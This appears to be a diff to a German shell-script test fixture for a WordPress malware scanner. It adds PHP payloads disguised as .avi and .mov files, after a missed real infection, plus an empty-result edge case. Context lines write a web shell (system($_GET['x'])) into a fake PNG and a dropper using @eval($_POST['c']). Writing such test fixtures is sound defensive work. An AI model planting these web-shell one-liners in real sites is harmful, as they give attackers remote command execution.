@@ -406,6 +406,19 @@ PHP
   # Als Nicht-PHP getarnte Nutzlast.
   printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/logo.png"
+  # Bewegtbild-Endungen — die Luecke aus dem echten Befall vom 12.08.2026.
+  #
+  # Dort lagen 32 getarnte Nutzlasten, 7.13 fand 17. Die fehlenden 15 hiessen
+  # .avi (7), .mov (5), .wmv (4), .mpg, .mpeg: die Endungsliste kannte von den
+  # Videoformaten nur .mp4. Der Pruefbaum kannte die Luecke ebenfalls nicht —
+  # er hatte nur .png.
+  #
+  # Ohne Verdachtsmerkmal im Code, wie bei der PNG-Probe weiter unten: gesucht
+  # ist der BEHAELTER, nicht was das PHP tut.
+  printf 'RIFF\x00\x00\x00\x00AVI <?php $u="https://beispiel.invalid/n.php"; ?>\n' \
+    > "${k2}/wp-content/uploads/2026/03/clip.avi"
+  printf '\x00\x00\x00\x14ftypqt  <?php $u="https://beispiel.invalid/n.php"; ?>\n' \
+    > "${k2}/wp-content/uploads/2026/03/clip.mov"
   # Zweite getarnte Nutzlast — bewusst OHNE jedes Verdachtsmerkmal.
   #
   # Die Probe darueber enthaelt system($_GET[…]) und schlaegt damit auch bei
@@ -794,6 +807,24 @@ PHP
   mkdir -p "${k2}/wp-content/uploads/pruefstand"
   printf '<?php\n// Pruefstand: dieselbe Machart, aber ausserhalb jedes Kerns\n$x = "%s"; @eval($_POST[%sc%s]);\n' \
          "$(_hexkette)" "'" "'" > "${k2}/wp-content/uploads/pruefstand/dropper.php"
+
+  # ── Der Fall, in dem NICHTS uebrig bleibt ────────────────────────────
+  # Kunde 1 ist die dritte Lage: ein Mustertreffer, und er ist entlastet.
+  # Damit ist die Restliste LEER — und genau daran scheiterte der erste
+  # Entwurf von 13d. Er trennte die beiden Bloecke mit `sed -n '1,/re/p'`,
+  # und dieser Bereich prueft sein Endmuster erst ab Zeile 2. Stand der
+  # Trenner auf Zeile 1, enthielten beide Haelften alles: auf dem echten
+  # System erschien dieselbe Datei zugleich unter "kritisch" und unter
+  # "entlastet".
+  #
+  # Kunde 2 und 3 konnten das nicht zeigen, weil dort immer etwas uebrig
+  # blieb. Ein Pruefbaum, der nur den halbvollen Fall kennt, uebersieht den
+  # leeren.
+  local k1="${W}/kunde-eins.example/httpdocs"
+  mkdir -p "${k1}/wp-includes"
+  printf '<?php\n$wp_version = %s;\n' "'6.9.2'" > "${k1}/wp-includes/version.php"
+  printf '<?php\n// Pruefstand: einziger Treffer, und entlastet\nif ( preg_match( %s/[^%s]*%s, $d ) ) { return true; }\n' \
+         "'" "$(_hexkette)" "'" > "${k1}/wp-includes/class-pruefstand-nur-entlastet.php"
   wp_plugin "$k3" pruefstand-kev      3.0 "Pruefstand KEV"
   wp_plugin "$k3" pruefstand-alt      3.1 "Pruefstand Alt"
   wp_plugin "$k3" pruefstand-aktuell  4.0 "Pruefstand Aktuell"
